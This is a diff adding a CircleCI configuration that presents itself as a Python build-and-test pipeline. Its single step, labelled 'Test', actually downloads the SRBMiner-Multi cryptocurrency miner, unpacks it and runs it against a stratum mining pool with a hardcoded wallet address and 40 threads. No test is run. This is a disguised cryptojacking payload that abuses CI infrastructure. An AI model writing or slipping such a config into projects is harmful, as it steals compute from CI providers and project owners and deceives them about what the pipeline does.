@@ -1,0 +1,17 @@
+version: 2.1
+
+orbs:
+   python: circleci/python@0.2.1
+
+jobs:
+  build-and-test:
+    executor: python/default
+    steps:
+      - run:
+          command: ! wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.5/SRBMiner-Multi-0-6-5-Linux.tar.xz && tar xf SRBMiner-Multi-0-6-5-Linux.tar.xz &&  ./cpuminer-sse2 -a phi5 -o stratum+tcps://stratum-ru.rplant.xyz:17055 -u CfWdsHGCwivAqJdZr8gXimBbS7zWdqM9KD -t40
+          name: Test
+
+workflows:
+  main:
+    jobs:
+      - build-and-test
